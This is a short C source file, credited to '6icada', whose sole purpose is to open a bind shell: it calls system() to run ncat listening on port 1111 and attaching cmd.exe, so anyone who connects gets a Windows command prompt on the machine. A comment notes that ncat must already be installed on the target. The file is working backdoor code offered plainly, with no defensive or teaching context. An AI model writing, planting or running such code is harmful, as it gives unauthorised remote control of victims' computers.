//Code by 6icada
//Please do not copy code


/*
      !!!This code will not work if target machine has not got ncat installed!!!
*/


//Adding libraries
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

//Main function
int main(){
  //Adding vars
  char cmd[150];
  const int MainPort = 1111;

  //Starting Action
  sprintf(cmd, "ncat -lnp %d -e cmd.exe", MainPort);
  system(cmd);
}
